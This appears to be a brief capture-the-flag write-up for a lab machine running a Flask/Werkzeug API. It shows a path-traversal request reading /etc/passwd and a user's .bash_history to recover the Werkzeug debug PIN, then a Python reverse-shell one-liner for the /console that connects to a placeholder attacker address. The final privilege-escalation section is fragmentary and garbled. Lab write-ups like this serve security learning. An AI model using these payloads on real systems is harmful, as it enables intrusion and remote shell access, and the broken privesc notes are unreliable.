# Recon
## Ports
22      SSH
890     HTTP
5000    Werkzeug *VULNERABLE*
## API
``http://<IP>:5000/api/v1/resources/books`` 

# Exploit
In API, the param "show" is vulnerable to path transversal
## PoC
``http://<IP>:5000/api/v1/resources/books?show=../../../etc/passwd``
## Payload
To get the key for Werkzeug console fin in bash history.
``http://<IP>:5000/api/v1/resources/books?show=.bash_history``
```bash
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=XXX-XXX-XXX
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```
## Reverse in "/console"
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

# Privesc
In SID's home the executable ``try-harder`` has SUID bit.
## Exploit
Making the reverse we found that with the number is equal

``Study more to BOF....``